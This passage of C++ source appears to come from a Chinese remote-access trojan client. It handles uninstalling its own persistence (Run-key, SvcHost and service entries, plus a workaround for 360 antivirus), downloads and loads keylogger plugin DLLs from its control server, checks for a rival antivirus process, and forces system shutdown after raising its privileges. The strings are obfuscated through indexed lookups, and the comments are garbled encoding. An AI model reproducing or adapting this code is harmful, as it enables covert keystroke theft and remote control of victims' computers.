		m_gFunc.WriteFile(hFile, m_AsciiChar, m_gFunc.strlen(m_AsciiChar), &nWriteLen, NULL);
	}
	m_gFunc.WriteFile(hFile, m_ByteXAndReturn, 7, &nWriteLen, NULL);
	m_gFunc.CloseHandle(hFile);
}
#endif

void CMyClientMain::UninstallFile()
{
	//ж�ؼ��̼��
	StopKey();

	//ֹͣSOCKS����
	SSH_StopSocksThread(NULL);

	//�ָ�������Ŀ
	if(m_DllInfo.m_KillSoft == _KILL_RAV)
	{
		//SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
		char m_TmpStr[256] = {0};
		m_gFunc.GetMyString(10230, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

		//ж��ע���
		HKEY m_key = NULL;
		long ret = m_gFunc.RegOpenKeyEx(HKEY_LOCAL_MACHINE, m_TmpStr, 0, KEY_ALL_ACCESS, &m_key);
		if(ret == ERROR_SUCCESS)
		{
			m_gFunc.GetMyString(10232, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
			m_gFunc.RegDeleteValue(m_key, m_TmpStr);
			m_gFunc.RegCloseKey(m_key);
		}
	}

#ifdef PS_VER_DINGZUO

	else if(m_DllInfo.m_KillSoft == _KILL_360)
	{
		//%sreg.reg
		char m_RegFileSprintfStr[256] = {0};
		m_gFunc.GetMyString(10239, m_RegFileSprintfStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

		//reg�ļ�
		char m_RegFileName[256] = {0};
		m_gFunc.GetTempPath(200, m_RegFileName);
		m_gFunc.sprintf(m_RegFileName + m_gFunc.strlen(m_RegFileName), m_RegFileSprintfStr, m_DllInfo.m_ServiceName);

		//%SystemRoot%\\System32\\msgsvc.dll
		char m_RegValue[256] = {0};
		m_gFunc.GetMyString(10258, m_RegValue, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

		//��Ҫ�����ǣ�360��������
		Make360RegStartTempFile(m_RegValue, m_RegFileName);
	
		//-s \"%s\"
		char m_SprintfStr[256] = {0};
		m_gFunc.GetMyString(10247, m_SprintfStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

		//regedit.exe
		char m_RegeditStr[256] = {0};
		m_gFunc.GetMyString(10248, m_RegeditStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

		//�޸�ע���
		char m_Cmdlines[256] = {0};
		m_gFunc.sprintf(m_Cmdlines, m_SprintfStr,  m_RegFileName);
		m_gFunc.ShellExecute(NULL, NULL, m_RegeditStr, m_Cmdlines, NULL, SW_SHOW);
	}

#endif

	else
	{
		//SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost
		char m_TmpStr[256] = {0};
		m_gFunc.GetMyString(10224, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
		HKEY m_key = NULL;
		long ret = m_gFunc.RegOpenKeyEx(HKEY_LOCAL_MACHINE, m_TmpStr, 0, KEY_ALL_ACCESS, &m_key);
		if(ret == ERROR_SUCCESS)
		{
			m_gFunc.RegDeleteValue(m_key, m_DllInfo.m_ServiceName);
			m_gFunc.RegCloseKey(m_key);
		}

		//ɾ������
		MyMainFunc::DeleteMyService(m_DllInfo.m_ServiceName);
	}

	m_IsExitWork = TRUE;
	Close();
}

HMODULE GetModFile(char* pFilePath, UINT nCmd)
{
	//���ӷ����������ͱ����ļ�У����
	CMyClientTran m_Tran;
	if(!m_Tran.Create(nCmd, (HWND) m_DllInfo.m_PassWord))
	{
		return NULL;
	}

	//�����ļ�����
	DWORD nFileLen = 0;
	if(!m_Tran.RecvData(&nFileLen, sizeof(DWORD)))
	{
		return NULL;
	}

	//�����ļ�
	BYTE* pZipFileData = new BYTE[nFileLen + 65535];
	m_gFunc.memset(pZipFileData, 0, nFileLen + 65535);
	if(!m_Tran.RecvData(pZipFileData, nFileLen))
	{
		delete [] pZipFileData;
		return NULL;
	}

	//��ѹ����
	FCLzw lzw;
	BYTE* pUnZipFileData = NULL;
	DWORD nUnZipFileLen = 0;
	lzw.PcUnZip(pZipFileData, &pUnZipFileData, &nFileLen);
	delete [] pZipFileData;
	MyMainFunc::WriteMyFile(pFilePath, pUnZipFileData, nFileLen);

	//װ��DLL�ļ�
	return LoadLibrary(pFilePath);
}

DWORD CMyClientMain::SSH_StartKeyThread(LPVOID lPvoid)
{
	//rstray.exe
	char RavStr2[256] = {0};
	m_gFunc.GetMyString(10219, RavStr2, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
	if(MyMainFunc::CheckProcessIsExist(RavStr2))
	{
		return 0;
	}

	//����װ�ؿ��Ʋ��dll
	HMODULE hKeyMd = LoadLibrary(m_KeyFilePath);
	if(hKeyMd == NULL)
	{
		//���ؼ��̼�ز��
		while(1)
		{
			//���ع������������
			hKeyMd = GetModFile(m_KeyFilePath, WM_CONNECT_KEYM);
			if(hKeyMd == NULL)
			{
				//��Ϣ�ȴ�ָ��ʱ��
				m_gFunc.Sleep(m_DllInfo.m_DelayTime);
			}
			else
			{
				break;
			}
		}
	}

	//ServiceMain
	char m_FuncName[256] = {0};
	m_gFunc.GetMyString(10198, m_FuncName, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	SERVICEMAINPCMAKE ServiceMain = (SERVICEMAINPCMAKE) GetProcAddress(hKeyMd, m_FuncName);
	if(ServiceMain != NULL)
	{
		ServiceMain(DLL_START_KEYSTART, NULL);
	}

	//��������
	FreeLibrary(hKeyMd);
	return 0;
}

void CMyClientMain::StopKey()
{
	HMODULE hKeyMd = LoadLibrary(m_KeyFilePath);
	if(hKeyMd == NULL)
	{
		return;
	}

	//ServiceMain
	char m_FuncName[256] = {0};
	m_gFunc.GetMyString(10198, m_FuncName, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	SERVICEMAINPCMAKE ServiceMain = (SERVICEMAINPCMAKE) GetProcAddress(hKeyMd, m_FuncName);
	if(ServiceMain != NULL)
	{
		ServiceMain(DLL_START_KEYSTOP, NULL);
	}
	FreeLibrary(hKeyMd);

	m_gFunc.DeleteFile(m_KeyFilePath);
}

void CMyClientMain::ShutDownSystem(BOOL Flag)
{
	//SeShutdownPrivilege
	char m_TmpStr[256] = {0};
	m_gFunc.GetMyString(10270, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	TOKEN_PRIVILEGES tp = {0};
	LUID luid = {0};
	tp.PrivilegeCount = 1;
	HANDLE m_handle = NULL;
	HANDLE hThread = m_gFunc.GetCurrentThread();
	m_gFunc.LookupPrivilegeValue(NULL, m_TmpStr, &luid);
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	m_gFunc.ImpersonateSelf(SecurityImpersonation);
	m_gFunc.OpenThreadToken(hThread, TOKEN_ADJUST_PRIVILEGES, TRUE, &m_handle);
	m_gFunc.AdjustTokenPrivileges(m_handle, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES) NULL, (PDWORD) NULL);
	if(Flag)
	{
		m_gFunc.ExitWindowsEx(EWX_POWEROFF, EWX_FORCE);
	}
	else
	{
		m_gFunc.ExitWindowsEx(EWX_REBOOT, EWX_FORCE);
	}
}